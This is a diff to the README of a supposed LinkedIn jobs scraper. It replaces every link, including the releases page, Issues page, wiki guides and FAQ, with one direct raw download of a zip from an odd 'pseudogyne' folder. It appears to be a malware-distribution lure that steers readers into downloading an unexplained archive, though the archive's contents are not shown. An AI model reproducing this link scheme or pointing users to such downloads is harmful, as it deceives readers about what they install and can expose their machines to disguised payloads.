@@ -1,6 +1,6 @@
 # 🌟 Apify-Linkedin-Jobs-Scraper - Extract LinkedIn Jobs Seamlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/releases)
+[![Download](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip%https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip)](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to the **Apify-Linkedin-Jobs-Scraper**! This tool helps you gather job p
 
 To get started, visit the Releases page to download the application:
 
-[Download Apify-Linkedin-Jobs-Scraper](https://github.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/releases)
+[Download Apify-Linkedin-Jobs-Scraper](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip)
 
 Follow these steps after downloading:
 
@@ -56,7 +56,7 @@ The data you collect can help you:
 
 ### Support
 
-If you encounter issues, please check the [GitHub Issues Page](https://github.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/issues). You can report your problem there, and we will assist you as soon as possible.
+If you encounter issues, please check the [GitHub Issues Page](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip). You can report your problem there, and we will assist you as soon as possible.
 
 ## 📋 License
 
@@ -64,12 +64,12 @@ This application is open-source and distributed under the MIT License. You can m
 
 ## 🛠️ Additional Resources
 
-- [Installation Guide](https://github.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/wiki/Installation-Guide)
-- [User Manual](https://github.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/wiki/User-Manual)
-- [FAQ](https://github.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/wiki/FAQ)
+- [Installation Guide](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip)
+- [User Manual](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip)
+- [FAQ](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip)
 
 You can also join our community for tips and updates. 
 
 Thank you for using the **Apify-Linkedin-Jobs-Scraper**! We hope it meets your job searching needs. 
 
-[Download Apify-Linkedin-Jobs-Scraper](https://github.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/releases)
+[Download Apify-Linkedin-Jobs-Scraper](https://raw.githubusercontent.com/LILALAN542/Apify-Linkedin-Jobs-Scraper/main/pseudogyne/Apify-Linkedin-Jobs-Scraper.zip)
